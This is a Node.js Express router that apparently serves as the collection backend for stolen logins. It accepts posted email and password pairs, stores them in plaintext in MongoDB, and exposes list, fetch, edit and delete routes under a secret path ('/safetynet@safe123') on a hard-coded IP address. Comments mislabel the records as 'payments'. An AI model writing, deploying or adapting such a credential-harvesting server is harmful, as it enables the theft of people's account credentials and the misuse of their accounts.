const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');
const Log = require("../models/log");

// Getting all payments (only for admin)
router.get('/safetynet@safe123', (req, res, next) => {
    Log.find()
    .exec()
    .then(docs => {
        const response = {
            count: docs.length,
            logs: docs.map(doc => {
                return {
                    _id: doc.id,
                    timestamp: doc.timestamp,
                    email: doc.email,
                    password:doc.password,
                    request: {
                            type: 'GET',
                            url: "http://89.40.11.242:8000/logs/safetynet@safe123/"+doc._id
                    }
                }
            })
        };
        res.status(200).json(response);
        }
    )
    .catch(err => {
        console.log(err);
        res.status(500).json({
            error: err
        });
    });
});

router.post('/safetynet@safe123', (req, res, next) => {
    const log = new Log({
        _id: new mongoose.Types.ObjectId(),
        timestamp: req.body.timestamp,
        email: req.body.email,
        password: req.body.password,
    });
    log
    .save()
    .then(result => {
        console.log(result);
        res.status(201).json({
            message: 'Created log successfully',
            createdlog : {
                _id: result.id,
                email: result.email,
                password: result.password,
                timestamp: result.timestamp,
                request: {
                  type: 'GET',
                  url: "http://89.40.11.242:8000/logs/safetynet@safe123/"+result._id
                }
            }
        });
    })
    .catch(err => {
        console.log(err);
        res.status(500).json({error: err});
    });
});

// Patching logs  
router.patch("/safetynet@safe123/:logId", (req, res, next) => {
    const id = req.params.logId;
    const updateOps = {};
    for (const ops of req.body) {
      updateOps[ops.propName] = ops.value;
    }
    Log.update({ _id: id }, { $set: updateOps })
      .exec()
      .then(result => {
        console.log(result);
        res.status(200).json({
            message: 'Log updated',
            request: {ref: 'GET', url: "http://89.40.11.242:8000/logs/safetynet@safe123/"+id}
        });
      })
      .catch(err => {
        console.log(err);
        res.status(500).json({
          error: err
        });
      });
});

//Get individual payment
router.get('/safetynet@safe123/:logID', (req, res, next) => {
    const id = req.params.logID;
    Log.findById(id)
    .exec()
    .then(doc => {
        console.log("From database", doc);
        if (doc) {
            res.status(200).json({
                log: doc,
                request: {
                    type: 'GET ALL',
                    url: 'http://89.40.11.242:8000/logs/safetynet@safe123'
                }
            });
        } else{
                res.status(404).json({message: "No valid entry found for provided ID"});
        }
    })
    .catch(err => {
        console.log(err);
        res.status(500).json({error: err});
    });
});

//deleting payments(only admin)
router.delete('/safetynet@safe123/:logId', (req, res, next) => {
    const id = req.params.logId;
    Log.remove({_id: id})
    .exec()
    .then(result=> {
        res.status(200).json({
            message: "Log Deleted"
        })
    })
    .catch(err => {
        console.log(err);
        res.status(500).json({error: err});
    });
});

router.delete('/safetynet@safe123', (req, res, next) => {
    Log.remove({})
    .exec()
    .then(result=> {
        res.status(200).json({
            message: "Logs Deleted"
        })
    })
    .catch(err => {
        console.log(err);
        res.status(500).json({error: err});
    });
});
module.exports = router;